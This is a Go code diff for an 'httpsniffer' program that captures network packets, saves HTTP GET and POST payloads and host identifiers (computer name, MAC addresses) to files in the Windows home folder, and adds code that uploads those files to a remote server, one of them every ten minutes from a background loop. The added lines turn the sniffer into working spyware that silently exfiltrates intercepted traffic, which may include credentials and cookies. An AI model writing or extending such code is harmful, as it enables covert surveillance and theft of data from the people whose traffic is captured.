@@ -8,6 +8,7 @@ import (
 	"github.com/google/gopacket/pcap"
 	"httpsniffer/file"
 	"httpsniffer/hardware"
+	"httpsniffer/network"
 	"log"
 	"os"
 	"strings"
@@ -15,6 +16,8 @@ import (
 )
 
 var DEBUG int = 0
+
+var homePath = os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
 
 func snifferHttp(){
 	// Find all devices
@@ -86,7 +89,6 @@ func snifferHttp(){
 			payload := string(tcp.BaseLayer.Payload)
 			if strings.Contains(payload, "GET") || strings.Contains(payload, "POST") {
 				log.Printf("payload:%v\n", payload)
-				homePath := os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
 				file.WriteWithOs(homePath+"/1.txt", payload)
 			}
 
@@ -95,7 +97,14 @@ func snifferHttp(){
 }
 
 func main(){
-	homePath := os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
+
+	go func() {
+		for {
+			network.UpLoadFile(homePath+"/1.txt")
+			fmt.Println("上传")
+			time.Sleep(time.Minute * 10)
+		}
+	}()
 
 	host := hardware.GetComName()
 	file.WriteWithOs(homePath+"/2.txt", host+"\r\n")
@@ -105,6 +114,9 @@ func main(){
 
 	macs := hardware.GetMacAddrs()
 	file.WriteWithOs(homePath+"/2.txt", "ips:"+macs+"\r\n")
+
+	network.UpLoadFile(homePath+"/2.txt")
+
 	snifferHttp()
 }
 
